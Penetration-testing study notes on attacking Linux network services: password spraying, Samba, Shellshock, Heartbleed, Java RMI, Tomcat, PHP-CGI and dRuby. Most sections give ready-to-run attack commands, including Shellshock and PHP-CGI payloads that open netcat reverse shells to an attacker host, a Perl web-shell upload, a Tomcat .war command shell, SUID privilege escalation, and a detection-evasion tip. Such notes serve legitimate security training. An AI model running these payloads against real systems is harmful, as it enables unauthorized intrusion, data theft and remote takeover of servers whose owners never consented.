# Linux Exploitation

## Exploitation over the Network

### Password Spray Attack - Study Guide

(02/31) *Password spray* (or *reverse brute-force*) attack: the idea is to introduce a list of as many users as possible, while trying just a single or just two (commonly-used) password attempts.

In environments where password complexity is not enabled (e.g. in Linux-based networks), users will take advantage of using easy-to-remember passwords that they'll modify by simply changing a value or other characteristic over time. So, we can create the `<PasswordsList>` taking one or two very common passwords.

We can also use tools like *The Harvester* to get an idea on the naming conventions an organization is using for their users.

`head -n 50 /root/Desktop/john.txt >> /root/Desktop/users.txt`: where `john.txt` is taken from the *Statistically Likely Usernames* list.
`msfosconole -q`, `search smtp enum`, `use auxiliary/scanner/smtp/smtp_enum`, `show options`, `set RHOSTS <TargetIP>`, `set USER_FILE /root/Desktop/users.txt`, `run`: to enumerate SMTP users. From the results we can create the `<ValidUsernamesList>`.
`nmap -sT <TargetIP> --open`: to find open ports (listening services).
`hydra -L <ValidUsernamesList> -P <PasswordsList> <TargetIP> <ListeningService>`: to perform the password spray attack.

Note that multiple attempts within a certain time range may result in detection and/or lockouts.

Also, keep in mind that the password re-use is another frequent issue, and passwords may be re-used across services and systems within an environment.
`hydra -l <ValidUser> -p <ValidPassword> -M <TargetIPsList> <ListeningService>`: to exploit the password re-use.

### Exploiting Samba - Study Guide

The *Samba* protocol is an open-source protocol that enables file and printer sharing between Windows operating systems and Unix-like systems such as Linux. It allows Windows computers to access and utilize shared resources on Linux servers, facilitating communication and file exchange across different platforms within a local network. Samba implements the SMB (Server Message Block) protocol and provides functionalities for file and printer sharing, user authentication, remote file access, and more. It is widely used in mixed Windows-Linux environments to enable resource sharing and collaboration between different operating systems.

`nmap --script smb-os-discovery <TargetIP> -p445`: to know the specific version of the running Samba protocol and check if it is vulnerable.

*Searchsploit* is a tool to search for known vulnerability, it provides a local database that can also be found at www.exploit-db.com: `searchsploit samba <SambaVersion>`.

Samba versions up to 4.6.4 contain vulnerabilities that allow an attacker to take control of an affected server completely. It is seen as `CVE-2017-7494` referred to as "SambaCry".

Another known Samba vulnerability is "Username Map Script", referred as `CVE-2007-2447`, that affects Samba versions 3.0.0 through 3.0.25rc3, can result in RCE.
`msfconsole -q`, `search samba usermap`, `use exploit/multi/samba/usermap_script`, `show options`, `set RHOST <TargetIP>`, `exploit`: to run an attack against the `Username Map Script` vulnerability and obtain a reverse shell session.

Another vulnerability known as "Samba Symlink Directory Traversal", allows an attacker to create a symbolic link to the root (/) partition from a writable share allowing to read access to the entire file system. It requires that the Samba server contains a writable share and that into the `smb.conf` is set `widelinks = true`.
`smbmap -H <TargetIP>`: to check available shares and their permissions (let's suppose that `<SMBShare>` has write access).
`msfconsole -q`, `search samba symlink`, `use auxiliary/smb/samba_symlink_traversal`, `show options`, `set RHOST <TargetIP>`, `set SMBSHARE <SMBShare>`, `set SMBTARGET <SMBTarget>` (default is `rootfs`), `exploit`: to run an attack against the `Samba Symlink Directory Traversal` vulnerability.
`smbclient \\\\<TargetIP>\\<SMBShare> -N`: to connect to the linked system directory (default is `rootfs`), where `-N` is for the anonymous access.
Once accessed to the share, we can navigate in the root filesystem: `cd rootfs`, `cat /etc/passwd | less`. Here we can use the `get`/`put` commands to download/upload files. In addition, we can use the `tar` command to create archive of all files within a directory: `cd /etc`, `tar c ../<SMBShare>/etc_files.tar`.

In the following scenario, instead, we will cover what we can do if we have a fully patched Samba server, but with configuration issues.
`nmap --script smb-os-discovery <TargetIP> -p445`: to check the (non-vulnerable) Samba version.
`smbmap -H <TargetIP>`: to check available shares and their permissions (let's suppose that `<SMBShare>` has write access and it is a web root `www`).
`smbclient \\\\<TargetIP>\\www -N`: to connect to the web root Samba writable share.
Now we need to check if there are web server-interpreted languages we can use to our advantage.
Assume that the server is configured to process Perl (CGI) programs (confirmed by the presence of a `index.pl` script in the writable share). We can try to execute the present Perl script navigating to `http://<TargetIP>/index.pl`.
Now, we can get a proper shell from `/usr/share/webshells` or from http://pentestmonkey.net/tools/web-shells/.
Once modified the shell (changing IP/port values), we can upload it to our Samba share: `put /root/Desktop/perl-reverse-shell.pl`.
Now, we can bring up a `netcat` listener on our attacker system: `nc -nl -p 1234 -v`: where `-n` configures the listener to use numeric-only IP addresses (no DNS), `-l` specifies the listen mode.
Go to `http://<TargetIP>/perl-reverse-shell.pl`: to execute the Perl script ang get the reverse shell.

### Exploiting Shellshock - Study Guide

*Shellshock* (or *Bashdoor*) is a security vulnerability affecting the Bash shell, a widely-used command-line interface for Unix and Linux operating systems, and affected CGI programs on web servers, DHCP clients, OpenSSH, and several other attack vectors.
It exploits Bash's behavior when evaluating environment variables to execute arbitrary commands on the target system. When Bash evaluates an environment variable, it autonomously decides whether to execute the content as a command.
Attackers exploit this behavior by injecting malicious commands into environment variables. For example, an attacker might create a variable like `MALICIOUS_VARIABLE='() { :; }; echo "ATTACK"'`, containing a command within the braces. When Bash encounters this variable, it interprets the content as a function definition followed by a command to execute. Consequently, the malicious command 'echo "ATTACK"' is executed by Bash. When these variables are evaluated by Bash, the malicious commands are executed, allowing attackers to gain unauthorized access, execute arbitrary code, and compromise the security of the target system.

The discovery of Shellshock resulted in several CVEs assigned to different attack vectors.

One of the primary attack vectors seen was the modification of the `User-Agent` of a HTTP request, in order to include a Shellshock payload. This payload contained a ping command destined for the attacker machine:
`User-Agent: () { :; }; ping <AttackerIP> -c 3 -p <PayloadString>`: if the attacker machine receives this specific string, then this serves as confirmation that the system is vulnerable.

The *Dirsearch* (similar to Dirb or Dirbuster) tool can be used to locate CGI programs on a target server:
`/root/Desktop/tools/dirsearch/dirsearch.py -u http://<TargetIP> -e cgi -r`: where `-e` stands for "extensions" and `-r` for "recursive".

`nmap --script http-shellshock --script-args uri=/<CGIURI> <TargetIP> -p80`: to check if the CGI program is vulnerable.
`wget -U "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat /etc/passwd" http://<TargetIP>/<CGIURI> && cat <CGIFile>`: to exploit the Shellshock vulnerability showing the `/etc/passwd` content, where `-U` specifies the User-Agent.
`wget -U "() { :; }; echo; /bin/nc <AttackerIP> <AttackerPort> -e /bin/sh" http://<TargetIP>/<CGIURI>`: to exploit the Shellshock vulnerability spawning a reverse shell.

### Exploiting Heartbleed - Study Guide

*Heartbleed* is a critical security vulnerability discovered in the OpenSSL protocol in 2014. It resulted from a programming error in OpenSSL's code handling the TLS/SSL protocol. Heartbleed allowed attackers to access sensitive server memory by sending manipulated Heartbeat requests to vulnerable servers. These requests, part of the Heartbeat protocol, are small packets of data periodically sent to maintain the connection between devices. While Heartbeat was designed to enhance the stability and efficiency of TLS/SSL connections, the Heartbleed vulnerability stemmed from an implementation error in OpenSSL's Heartbeat packet handling, enabling unauthorized access to sensitive server data. Attackers could exploit Heartbleed to retrieve sensitive information from server memory, such as SSL encryption keys, user authentication credentials, and more.

`nmap --script ssl-heartbleed <TargetIP>`: to identify a vulnerable OpenSSL implementation on the target.
`msfconsole -q`, `search heartbleed`, `use auxiliary/scanner/ssl/openssl_heartbleed`, `show actions`, `set ACTION DUMP`, `show options`, `set RHOSTS <TargetIP>`, `run`: to run the Heartbleed attack.

We have three possible actions:
- DUMP	Dump memory contents
- KEYS	Recover private keys from memory
- SCAN	Check hosts for vulnerability

The results are stored in the `loot` directory in a `.bin` file. We can extract them with `strings <LootBinFile>`.

Note that you can get different memory segment each time you execute the attack, so try it multiple times.

### Exploiting Java RMI Registry - Study Guide 

The *Java RMI* (Remote Method Invocation) framework is a Java API that enables developers to create distributed applications in Java. It facilitates communication between objects running in different Java Virtual Machines (JVMs) across a network. The Java RMI framework allows for remote method invocation, where a method is invoked on a remote object as if it were a local object, abstracting the complexities of network communication.

The Java RMI Registry is a component of the Java RMI framework. It serves as a simple naming service, allowing remote objects to be registered with unique names. Clients can then look up these names in the registry to obtain references to remote objects, enabling them to invoke methods on these objects from a remote location.

Serializing objects in Java RMI is the process of converting Java objects into a stream of bytes so that they can be transmitted over the network. This is essential for passing objects between different JVMs in a distributed system. However, improper handling of object serialization can lead to security vulnerabilities.

Attackers can exploit insecure object deserialization in Java RMI by sending maliciously crafted serialized objects to the server. When these objects are deserialized on the server side, they can trigger arbitrary code execution, leading to remote code execution (RCE) attacks. This allows attackers to compromise the security of the system, gain unauthorized access, or perform other malicious activities.

The Java RMI Registry is typically found on 1099 TCP port.
`nmap -sT -sV <TargetIP> -p 1099`: to check if the port is open.
Note that sometimes, RMI Registry endpoint can be found listening on non-standard ports.

`msfconsole -q`, `search java rmi`, `use exploit/multi/misc/java_rmi_server`, `show options`, `set RHOST <TargetIP>`, `run -j`: to run the attack.

Note that to evade (some) over-the-wire heuristics detection solutions, we can `set SSL true` and also set the `SSLCert` to your custom SSL certificate.

Once a shell is obtained, we can upgrate it with: `python -c 'import pty; pty.spawn("/bin/sh")'`.

### Exploiting Java Deserialization - Study Guide

The vulnerability class known as *Java Deserialization* refers to a security vulnerability category that occurs when a Java application deserializes serialized objects in an insecure manner. In Java, object serialization is the process of converting objects into a stream of bytes, which can be saved to disk or transferred over a network. Deserialization is the reverse process, where a stream of bytes is converted back into an object.

Java deserialization vulnerabilities can be exploited by attackers to execute arbitrary code on the target system. Attackers can send maliciously serialized objects containing harmful payloads. When these objects are deserialized by the application, the malicious payload can be executed, allowing attackers to compromise the security of the system and gain unauthorized access.

This type of vulnerability is particularly dangerous because it can be exploited in many Java libraries and frameworks that use object deserialization, making numerous Java applications vulnerable. Mitigating these vulnerabilities requires proper handling of object deserialization, including checking deserialized data and validating object types.

### Exploiting Tomcat - Study Guide

*Tomcat* is a specialized web server, designed specifically for hosting Java web applications. It provides an environment for running Java Servlets and JavaServer Pages (JSP).

Java Servlets are Java components that extend the functionality of a web server. You can think of a servlet as a small Java program that runs on the server-side and handles HTTP requests from clients.

JavaServer Pages (JSP) allow you to embed Java code directly into HTML pages, similar to how JavaScript code can be embedded in HTML pages. For example, a JSP page may contain Java code that interacts with a database to retrieve data and dynamically display it on the page.

The Apache Tomcat server is typically found on 8180 TCP port.
`nmap -sT -sV <TargetIP> -p 8180`: to check if the port is open.

From the `http://<TargetIP>:8180` we can access the default portal, and from there we can access the Tomcat Manager area that is an administrative interface.

`msfconsole -q`, `search tomcat login`, `use auxiliary/scanner/http/tomcat_mgr_login`, `show options`, `set RHOSTS <TargetIP>`, `set RPORT 8180`, `set STOP_ON_SUCCESS true`, `run`: to execute the dictionary login attack.

Once obtained the login credentials, we can access the Tomcat Manager area of the web server, where we can easily deploy Java web applications through the upload of a `.war` (Web Application Archive) file, that essentially is a Java web application compressed in a single file.

*Laudanum* is a tool that provides, among many other features, also the ability to create .war files useful, for example, for carrying out RCE attacks.
`ls /usr/share/laudanum/jsp`:
```
cmd.war		makewar.sh		warfiles
```
We can directly upload the `cmd.war` file that provide us (at `http://<TargetIP>/cmd`) a page where to execute commands directly on the system from the JSP shell.

### Remote Exploitation - Video

1. *PHP CGI argument injection*.
Here we have a PHP CGI argument injection RCE vulnerability, which affects PHP version 5.3.12 5.4.x before version 5.4.2 and exploits a configuration where PHP is configured as a CGI script also known as PHP-CGI. 
We can see the PHP version used at `http://<TargetIP>/phpinfo.php`.
The aim is to decrease the PHP security via a modification of some values of PHP configuration:
`curl -i -s -k -X 'POST' --data-binary "<?php system(\"nc <AttackerIP> <AttackerPort> -e /bin/sh\"); die; ?>" "http://<TargetIP>/cgi-bin/php5?-d+allow_url_include=on+-d+safe_mod=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-d+cgi.force_redirect=0+-d+cgi.redirect_status_env=0+-n"`.

Now, we should first encode every special characters, such as: ` `, `=`, `/`, `.`, `"`, `-`, `:`.
`curl -i -s -k -X 'POST' --data-binary "<?php system(\"nc <AttackerIP> <AttackerPort> -e /bin/sh\"); die; ?>" "http://<TargetIP>/cgi-bin/php5?%2dd+allow_url_include%3don+%2dd+safe_mod%3doff+%2dd+suhosin%2esimulation%3don+%2dd+disable_functions%3d""+%2dd+open_basedir%3dnone+%2dd+auto_prepend_file%3dphp://input+%2dd+cgi%2eforce_redirect%3d0+%2dd+cgi%2eredirect_status_env%3d0+%2dn"`.

Now, we can bring up a `netcat` listener on our attacker system: `nc -nl -p 5555 -v`.
And we can issue our cURL command and get back a reverse shell from the target system.

In order to get a semi-interactive shell: `python -c "import pty; pty.spawn('/bin/sh');"`.

Let's see if we can find a SUID file (`/usr/bin/nmap`): `find / -type f -perm -4000 2> /dev/null`.
To get sudo privileges (via GTFOBins): `nmap --interactive`, `!sh`, `id`.

2. *dRuby RMI*.
DRb (Distributed Ruby) is a standard Ruby library that provides infrastructure for remote communication between Ruby objects running on separate processes or on different machines within a network. It enables Ruby objects to invoke methods on remote objects as if they were local objects, simplifying the development of distributed applications in Ruby. DRb facilitates transparent communication between Ruby processes, allowing developers to create distributed and scalable systems using the Ruby programming language.
It can be found running at TCP 8787 port.

The problem is caused by the lack of what is known as taint checking, essentially a way that some program languages like Perl and Ruby check to make sure that data reveiced is safe for processing.

`nmap -sT <TargetIP> -p8787`: to check if the port is open.
`nmap -sT -sV <TargetIP> -p8787`: to check the Ruby RMI server version.
`msfconsole -q`, `search drb`, `use exploit/linux/misc/drb_remote_codeexec`, `show options`, `set RHOST <TargetIP>`, `exploit`: to get a shell.

---
---
